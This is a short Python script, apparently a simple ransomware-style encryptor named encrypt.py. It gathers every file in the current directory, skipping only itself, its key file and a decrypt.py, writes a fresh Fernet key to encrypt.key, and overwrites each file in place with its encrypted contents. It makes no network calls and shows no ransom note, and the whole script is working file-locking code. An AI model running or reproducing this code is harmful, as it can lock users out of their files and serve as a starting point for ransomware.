#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Locate files in the directory

files = []

for file in os.listdir():
        if file == 'encrypt.py'or file == 'encrypt.key' or file == 'decrypt.py':   # Not to decrypt the actual program
                continue
        if os.path.isfile(file):                           # Append any text files to the list
                files.append(file)

print(files)

key = Fernet.generate_key()

with open("encrypt.key","wb") as encryptkey:               # Make a file with write permissions
        encryptkey.write(key)                              # Write the encrypt key to the file

for file in files:
        with open(file,"rb") as contents:
                targets = contents.read()                 # Read the files
        targets_encrypted = Fernet(key).encrypt(targets)  # Encrypts all the files
        with open(file,"wb") as contents:                 # Write the files
                contents.write(targets_encrypted)         # Write the encrypted data to the files
